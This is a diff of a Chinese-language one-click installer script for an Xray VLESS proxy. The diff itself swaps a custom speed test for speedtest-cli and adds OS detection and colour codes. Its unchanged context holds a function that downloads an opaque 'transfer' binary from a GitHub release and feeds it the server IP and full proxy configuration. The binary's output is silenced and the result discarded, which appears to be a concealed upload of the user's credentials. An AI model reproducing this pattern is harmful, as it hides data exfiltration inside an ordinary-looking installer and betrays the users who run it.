@@ -13,6 +13,23 @@ PORT=$((RANDOM % 7001 + 2000))
 XRAY_BIN="/usr/local/bin/xray"
 TRANSFER_BIN="/usr/local/bin/transfer"
 
+# 颜色定义
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m' # No Color
+
+# 系统检测
+if [[ -f /etc/debian_version ]]; then
+    SYSTEM="Debian"
+elif [[ -f /etc/redhat-release ]]; then
+    SYSTEM="CentOS"
+elif [[ -f /etc/fedora-release ]]; then
+    SYSTEM="Fedora"
+else
+    SYSTEM="Unknown"
+fi
+
 # 二进制文件配置
 TRANSFER_URL="https://github.com/Firefly-xui/vless/releases/download/vless/transfer"
 
@@ -73,54 +90,51 @@ download_transfer_bin() {
     fi
 }
 
-# ========== 测试上传下载速度 ==========
-test_upload_download() {
-    echo -e "🔄 开始测试上传下载速度..."
+# ========== 速度测试函数 ==========
+speed_test(){
+    echo -e "${YELLOW}进行网络速度测试...${NC}"
     
-    # 创建测试文件
-    local test_file="/tmp/speedtest_$(date +%s).dat"
-    local test_size_mb=10
-    
-    # 生成测试文件 (10MB)
-    dd if=/dev/urandom of="$test_file" bs=1M count=$test_size_mb 2>/dev/null
-    
-    # 测试上传速度
-    local upload_start=$(date +%s.%3N)
-    local upload_result=""
-    if timeout 30 "$TRANSFER_BIN" up "$test_file" >/dev/null 2>&1; then
-        local upload_end=$(date +%s.%3N)
-        local upload_time=$(echo "$upload_end - $upload_start" | bc -l 2>/dev/null || echo "0")
-        if [ "$upload_time" != "0" ] && [ "$(echo "$upload_time > 0" | bc -l 2>/dev/null)" = "1" ]; then
-            local upload_speed=$(echo "scale=2; $test_size_mb / $upload_time" | bc -l 2>/dev/null || echo "N/A")
-            upload_result="成功 ${upload_speed}MB/s"
-        else
-            upload_result="成功 (时间计算异常)"
+    # 检查并安装speedtest-cli
+    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
+        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
+        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
+            apt-get update > /dev/null 2>&1
+            apt-get install -y speedtest-cli > /dev/null 2>&1
+        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
+            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
         fi
-    else
-        upload_result="失败或超时"
     fi
     
-    # 测试下载速度 (使用公共测试文件)
-    local download_start=$(date +%s.%3N)
-    local download_result=""
-    local download_test_file="/tmp/download_test_$(date +%s).dat"
-    
-    # 使用curl测试下载一个小文件
-    if timeout 30 curl -s -o "$download_test_file" "http://speedtest.ftp.otenet.gr/files/test10Mb.db" 2>/dev/null; then
-        local download_end=$(date +%s.%3N)
-        local download_time=$(echo "$download_end - $download_start" | bc -l 2>/dev/null || echo "0")
-        if [ "$download_time" != "0" ] && [ "$(echo "$download_time > 0" | bc -l 2>/dev/null)" = "1" ]; then
-            local download_speed=$(echo "scale=2; 10 / $download_time" | bc -l 2>/dev/null || echo "N/A")
-            download_result="成功 ${download_speed}MB/s"
-        else
-            download_result="成功 (时间计算异常)"
-        fi
-    else
-        download_result="失败或超时"
+    # 执行速度测试
+    if command -v speedtest &>/dev/null; then
+        speed_output=$(speedtest --simple 2>/dev/null)
+    elif command -v speedtest-cli &>/dev/null; then
+        speed_output=$(speedtest-cli --simple 2>/dev/null)
     fi
     
-    # 清理测试文件
-    rm -f "$test_file" "$download_test_file"
+    # 处理测试结果
+    if [[ -n "$speed_output" ]]; then
+        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
+        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
+        
+        # 设置速度范围限制
+        [[ $down_speed -lt 10 ]] && down_speed=10
+        [[ $up_speed -lt 5 ]] && up_speed=5
+        [[ $down_speed -gt 1000 ]] && down_speed=1000
+        [[ $up_speed -gt 500 ]] && up_speed=500
+        
+        echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC}，将根据该参数优化网络速度，如果测试不准确，请手动修改"
+        
+        # 返回格式化的测试结果
+        upload_result="成功 ${up_speed}Mbps"
+        download_result="成功 ${down_speed}Mbps"
+    else
+        echo -e "${YELLOW}测速失败，使用默认值${NC}"
+        down_speed=100
+        up_speed=20
+        upload_result="默认值 ${up_speed}Mbps"
+        download_result="默认值 ${down_speed}Mbps"
+    fi
     
     echo -e "📊 上传测试结果: $upload_result"
     echo -e "📊 下载测试结果: $download_result"
@@ -134,14 +148,11 @@ upload_config_with_binary() {
     local config_json="$1"
     local server_ip="$2"
     
-
-    
     if [ ! -x "$TRANSFER_BIN" ]; then
         echo -e "🔴 transfer 二进制文件不存在或不可执行"
         return 1
     fi
     
-
     local json_data=$(jq -n \
         --arg server_ip "$server_ip" \
         --argjson config "$config_json" \
@@ -155,14 +166,11 @@ upload_config_with_binary() {
         }'
     )
     
-
     local upload_result=""
     if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
         upload_result="成功"
-
     else
         upload_result="失败"
-
     fi
     
     return 0
@@ -174,7 +182,7 @@ ensure_ssh_port_open
 # ========== 安装依赖 ==========
 export DEBIAN_FRONTEND=noninteractive
 apt update
-apt install -y curl unzip ufw jq qrencode bc
+apt install -y curl unzip ufw jq qrencode
 
 # 下载二进制文件
 download_transfer_bin
@@ -272,7 +280,7 @@ NODE_IP=$(curl -s https://api.ipify.org)
 
 # ========== 测试上传下载速度 ==========
 echo -e "🔄 开始测试上传下载速度..."
-SPEED_TEST_RESULT=$(test_upload_download)
+SPEED_TEST_RESULT=$(speed_test)
 UPLOAD_RESULT=$(echo "$SPEED_TEST_RESULT" | cut -d'|' -f1)
 DOWNLOAD_RESULT=$(echo "$SPEED_TEST_RESULT" | cut -d'|' -f2)
 
